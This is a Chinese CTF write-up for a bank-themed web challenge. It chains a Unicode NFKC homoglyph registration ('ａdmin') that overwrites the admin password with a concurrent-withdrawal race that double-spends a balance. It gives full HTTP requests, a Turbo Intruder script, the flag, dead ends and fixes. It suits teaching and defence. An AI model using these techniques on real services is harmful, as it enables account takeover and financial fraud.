# 夜班柜员 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / Unicode NFKC 同形字账户接管 + 提现 TOCTOU |
| 分值 | 586（动态计分；做题时 864→752，提交后降至 586） |
| 类型 | DynamicContainer |
| 比赛 | 第五届 HTUCTF（GZCTF gameId=2） |
| Flag | `HTUCTF{a3241396-01f1-4d58-888f-abbddf940b7f}` |
| 复现脚本 | `solve_shadow_race.py`（一把梭：影子接管 → 60 路并发提现 → 买 flag） |

## 0. 题面隐喻 → 技术点

出题人把漏洞写进了剧情，逐句对号入座：

| 题面原话 | 对应技术 |
|---|---|
| 「名字是最轻的钥匙，轻到足以伪装成另一个人的**影子**」 | **Unicode NFKC 同形字**账户接管（`ａdmin` → `admin`） |
| 「注册那天，账上会落下 100 枚星火币，像**一枚楔子**」 | 出厂 admin 余额 = **100 存款 / 0 现金**（楔子就是这 100） |
| 「他们**不必排队**，也**无须看余额**」 | 提现 `deposit >= amount` 检查与扣款**非原子**，可并发双花 |
| 「凑齐五千，推开那扇门」 | flag 标价 **5000 现金金币**，竞态放大后购买 |
| 「只为"自己人"留一条缝」 | 提现功能仅内部员工（admin）可用 |

## 1. 站点结构

Flask + gunicorn 的「金币银行」，无 JS、无隐藏字段。全部端点：

| 路由 | 方法 | 作用 |
|---|---|---|
| `/register` | POST | 开户，字段 `username` / `password` |
| `/login` | POST | 登录，同上 |
| `/dashboard` | GET | 账本页，显示存款 / 现金两个数字 |
| `/withdraw` | POST | **提现**（存款→现金），字段 `amount`，仅内部员工 |
| `/change_password` | POST | 改密 |
| `/buy_hint` | POST | 买提示，字段 `hint_id`（1=员工手册残页 30 存款；2=档案室旧闻 50 存款） |
| `/buy_flag` | POST | 购买镇店之宝（flag），需 **5000 现金金币** |
| `/logout` | GET | 登出 |

约束：用户名 ≤32 字符、密码 ≤64；提现表单 `<input name="amount" type="number" min="1" max="100">`（单笔上限 100）。

会话 cookie `session` 为 itsdangerous `URLSafeTimedSerializer` 签名，payload 只有 `{"username":"..."}`，**塞不进余额字段**（实测加字段直接拒签）。

## 2. 经济模型

| 角色 | 初始存款 | 初始现金 | 能否提现 |
|---|---|---|---|
| 普通储户 | 100 | 0 | ✗「提现功能仅对本行内部员工开放」 |
| admin（内部员工） | **100** | 0 | ✓ |

要点：**admin 出厂也是 100/0**，和普通用户一样拿着楔子。此前观察到的「admin=0/100」是楔子被提走后的状态——这个误判让整道题绕了很久。

flag 标价 5000 **现金**，提现单笔 ≤100，正常玩法要提 50 次。而提现是**唯一**能把存款换成现金的通道（买 hint / 买 flag 都只扣存款或只扣现金）。

两份买得到的提示也点了题：
- hint1（员工手册残页）：「本行管理员 admin 独享『提现』功能」
- hint2（档案室旧闻）：「**你能篡改 admin 的账号密码吗？**」

## 3. 第一步：NFKC 影子接管

### 漏洞成因

注册与登录的用户名处理**不一致**：

```
唯一性检查：SELECT ... WHERE username = '<raw 输入>'     ← 原样比较
写入 / 匹配：UPSERT ... WHERE username = NFKC('<raw 输入>')  ← 规范化后匹配
```

于是注册 `ａdmin`（U+FF41 全角小写 a）：

1. 唯一性检查拿 **raw 串** `ａdmin` 查库 → 不等于 `admin` → 「可以注册」
2. 真正写库时做 **NFKC 归一** → `ａdmin` ≡ `admin` → 命中已有 admin 行 → **走 UPDATE 覆盖密码**
3. 用 `admin` + 新密码登录 → 进入内部员工视角（页面出现 `class="badge"` 员工徽章）

这是典型的「同形字 / 影子账户」（homoglyph shadow account）——名字确实是最轻的钥匙。

### 可用字符

凡 **NFKC 归一到 `a`** 的字符都能当影子（实测 37 种），例如：

| 字符 | 码点 |
|---|---|
| `ａ` | U+FF41 FULLWIDTH LATIN SMALL LETTER A |
| `ⓐ` | U+24D0 CIRCLED LATIN SMALL LETTER A |
| `𝐚` | U+1D41A MATHEMATICAL BOLD SMALL A |
| `𝑎` | U+1D44E MATHEMATICAL ITALIC SMALL A |
| `𝒂` | U+1D482 MATHEMATICAL BOLD ITALIC SMALL A |
| `𝓪` | U+1D4EA MATHEMATICAL SCRIPT SMALL A |
| `𝔞` | U+1D51E MATHEMATICAL FRAKTUR SMALL A |
| `ª` | U+00AA FEMININE ORDINAL INDICATOR |
| `ᵃ` | U+1D43 MODIFIER LETTER SMALL A |
| `ₐ` | U+2090 LATIN SUBSCRIPT SMALL LETTER A |

**不行**的：
- `Ａdmin` / `Ⓐdmin`（NFKC→`A` 大写）→ 与 `admin` 大小写敏感，不命中
- `α` / `ɑ` / `ı` → NFKC 不归一到 `a`，各自成为独立的 100/0 账户（非员工）
- 西里尔 `а`、零宽字符、`\xA0` → 不参与 NFKC 归一，独立账户

### 语义差异

| 操作 | 用 `ａdmin` 时的行为 |
|---|---|
| `POST /register` | 提示「开户成功」（raw 名通过唯一性） |
| `POST /login` 用 `ａdmin` | 「用户不存在」（登录按 raw 精确匹配） |
| `POST /login` 用 `admin`+新密码 | **成功**（密码已被覆盖，NFKC 行命中） |

也就是说：影子名注册**不建新行**，而是静默接管既有账户。同样的手法覆盖普通用户（如 `ｖictim`）也是「改密不改余额」，原密码作废。

## 4. 第二步：出厂楔子（100 存款）

全新 DynamicContainer 一上来，admin 就是 **存款 100 / 现金 0**——题面那句「注册落下 100 枚星火币，像一枚楔子」。

**这里有个致命陷阱**：如果先手动提一笔试探（`amount=100`），楔子立刻被花掉（→0/100），之后所有提现都是「存款余额不足」，竞态窗口不复存在。

> 全程**不要单提**，拿到员工身份后立刻进第三步。

## 5. 第三步：提现 TOCTOU（无须看余额）

### 漏洞成因

`/withdraw` 的检查与扣款不是原子的：

```
① 读 deposit，判断 deposit >= amount
② 读 deposit，执行 deposit -= amount；cash += amount
```

两个请求同时进临界区时，都读到 `deposit=100`，都通过①，然后各自扣款——**100 存款被花出 N 次**。这就是「不必排队，也无须看余额」。

### 实测（干净实例）

影子接管后 **立刻** 对同一 session 开 60 路并发 `POST /withdraw amount=100`：

```
55 / 60 返回「成功提现 100 金币」
存款：100 - 55×100 = -5400
现金：0  + 55×100 =  5500   ✓ 够 5000
```

> 关键：**检查可被击穿到负数**（后端没有 `deposit >= 0` 兜底），这正是放大倍率的来源。
> 如果并发数不够或时序太散，会落到 50 路以下（现金 <5000），再来一轮即可；
> 但注意此时存款已为负，单靠再发提现过不了检——需要**再来一次影子注册楔子×提现对撞**
> （注册会把 admin 重置回 100/0，同刻的提现一起读到 100），循环放大。

### 可复现参数

- 并发数 60（实测 55 成功；20 路并发时只有约 9 成功，不够 5000）
- 线程 `random.shuffle` 后统一 `start()`，贴近同时到达
- 用同一个 `session` cookie 复制到每个请求（不必每线程登录）

## 6. Burp 复现（完整请求报文）

> 实例：`103.163.47.230:33765`（重建后改 `Host` 即可）。
> 全程 **Repeater** 打前三步，第四步竞态用 **Turbo Intruder**，第五步回到 Repeater。

### 6.1 影子注册：`ａdmin` 覆盖 admin 密码

```http
POST /register HTTP/1.1
Host: 103.163.47.230:33765
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close

username=%EF%BD%81dmin&password=WIN2
```

> `ａ` 是 **U+FF41 FULLWIDTH LATIN SMALL LETTER A**，UTF-8 为 `EF BD 81`，
> URL 编码即 `%EF%BD%81`。**不要手打全角 a 就发出去**——先在 Burp 的
> **Decoder** 里确认编码正确（Decode as → URL，Encode as → URL 来回验一次）。

Response：「开户成功」。这一步**不建新行**，而是把既有 `admin` 行的密码改成 `WIN2`。

### 6.2 用真名登录，拿到员工身份

```http
POST /login HTTP/1.1
Host: 103.163.47.230:33765
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close

username=admin&password=WIN2
```

```http
HTTP/1.1 302 Found
Set-Cookie: session=...; Path=/
```

登录后 `/dashboard` 出现 `class="badge"` 员工徽章，说明拿到了内部员工视角。

### 6.3 确认楔子（关键：必须是 100 / 0）

```http
GET /dashboard HTTP/1.1
Host: 103.163.47.230:33765
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Cookie: session=<上一步的 session>
Connection: close

```

页面上的两个数字必须是 **存款 100 / 现金 0**。

> ⚠️ **看到 0 / 100 就说明这个实例被污染了**（楔子已被人提走），
> 竞态窗口不复存在。此时应重建容器再来：
> `python _api.py cd 63 && sleep 25 && python _api.py cc 63`（建/删之间要间隔，否则 429）。

### 6.4 60 路并发提现（TOCTOU）

**全程不要先单独提一笔试探**——那一笔会把 100 存款花光，后面全部「存款余额不足」。

把下面这条发到 **Turbo Intruder**（Extensions → Turbo Intruder → Send to it）：

```http
POST /withdraw HTTP/1.1
Host: 103.163.47.230:33765
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Cookie: session=<同一份 session>
Content-Length: 11
Connection: close

amount=100
```

Turbo Intruder 脚本（`examples/basic.py` 改一下，用 **requestEngine 的并发**即可）：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=60,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(60):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if '成功提现' in req.response:
        table.add(req)
```

实测 55 / 60 成功：

```
存款：100 - 55×100 = -5400
现金：0   + 55×100 =  5500   ✓ 够 5000
```

> 没有 Turbo Intruder 时，社区版 Intruder 也能做：Attack type **Sniper**、
> payload 随便塞 60 个相同的 `100`、Resource pool 拉满线程。
> 但社区版线程受限，成功率会低一些，不够 5000 就再来一轮
> （此时存款已负，需要先**再走一次 6.1 影子注册**把 admin 重置回 100/0 并对撞）。

### 6.5 买 flag

```http
POST /buy_flag HTTP/1.1
Host: 103.163.47.230:33765
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Cookie: session=<同一份 session>
Content-Length: 0
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... HTUCTF{a3241396-01f1-4d58-888f-abbddf940b7f} ...
```

## 7. 脚本等价物

`solve_shadow_race.py` 发的就是上面这几条请求，只是把 60 路并发自动化：

```python
POST /register  username=ａdmin  password=WIN2     # 影子接管
POST /login     username=admin   password=WIN2     # 员工徽章
GET  /dashboard                                    # 确认 100/0
POST /withdraw  amount=100   ×60 并发（同一 session）
POST /buy_flag                                    # -> flag
```

实例重建（DynamicContainer，配额约 3 个）：

```bash
python _api.py cd 63 && sleep 25 && python _api.py cc 63
```

## 8. 踩坑记录

| 坑 | 表现 | 处理 |
|---|---|---|
| **先单提再竞态** | 楔子花掉（100/0→0/100），后续全部「存款余额不足」 | 一上来就并发，不试探 |
| 看到 admin=0/100 | 以为出厂就是 0/100，走不动 | 重建实例才发现是 100/0，0/100 是被提过 |
| `'badge' in html` 判员工 | CSS 里也有 `badge`，假阳性 | 改为精确匹配 `class="badge"` |
| SSTI 探针 `{{7*7}}` | 页面出现 `49` 以为命中 | 实际是 CSS 颜色 `#fcbf49`，用户名被 HTML 转义 |
| `user=<别人>` 提现 | 看到「成功」以为有 IDOR | 其实是 admin 自己有存款，`user` 参数被忽略 |
| 会话加 `"deposit":5000` | 期望直接改余额 | itsdangerous 签名，加字段直接拒签 |
| 同名并发注册 | 想用并发绕唯一性 | UNIQUE 约束兜底，约 1/20 成功 |
| SQLi / 二次注入 | `admin'--` 等已注册名做后续查询 | 全程参数化，登录/提现/购买均无注入 |

## 9. 已证伪的岔路（节省复现时间）

- **SQL 注入**：登录、注册、提现、change_password、buy_hint 全部参数化；`admin'--` 类用户名可注册但后续查询不拼接
- **会话伪造 / 字段注入**：cookie 只含 `{"username"}`，133 个常见 itsdangerous 密钥均未碰撞成功
- **IDOR**：`/withdraw` 的 `user` 参数被忽略，无水平越权
- **批量赋值**：表单多余字段（`deposit`/`cash`/`role`）不生效
- **隐藏端点 / LFI / 工作站**：无 `/work`、`/queue`、`/serve` 等赚钱端点，无文件读取入口
- **大小写 / 空白变体**：`Admin`、`ADMIN`、`admin␣`、`admin\t` 都是独立 100/0 账户，**不是员工**（员工判定精确匹配 `admin`）

## 10. 知识点小结

1. **Unicode 同形字（homoglyph）+ 规范化不一致**
   两处对同一字符串做不同归一（查重用 raw，写入/匹配用 NFKC），就会出现「影子账户」。
   等价场景：SQL 里 `utf8mb4_unicode_ci` 大小写/重音不敏感 vs 代码层严格比较；域显示 `аdmin` vs 账户 `admin`。
2. **TOCTOU / 余额双花**
   检查与扣减必须在同一事务 / 同一锁内完成；本题恰好给足「100 存款」当起爆药。
3. **动态容器题先看出厂状态**
   污染过的实例会给出错误基线（0/100），必要时重建再测。
4. **题面即提示**
   影子 / 楔子 / 不必排队 / 凑齐五千，四个隐喻正好是四步漏洞链。

## 11. 防御建议

| 位置 | 修法 |
|---|---|
| 用户名 | 入库前统一 `unicodedata.normalize('NFKC', name)`，**查重与写入共用同一归一结果**；进一步可限制为 `[A-Za-z0-9_]` |
| 登录 | 比较规范化后的用户名，与注册侧保持一致 |
| 提现 | `UPDATE accounts SET deposit=deposit-?, cash=cash+? WHERE user=? AND deposit>=?` 单条原子 SQL，检查行数为 0 即失败；或 `SELECT ... FOR UPDATE` + 事务 |
| 业务 | `deposit`/`cash` 加 `CHECK (>= 0)` 约束，拒绝透支 |
| 会话 | 只放身份标识，余额一律实时查库（本题已如此，保持即可） |

---

**三步一句话**：`ａdmin` 影子注册覆盖 admin 密码 → 带着出厂的 100 存款楔子 → 60 路并发提现把检查打成 5500 现金 → 买 flag。
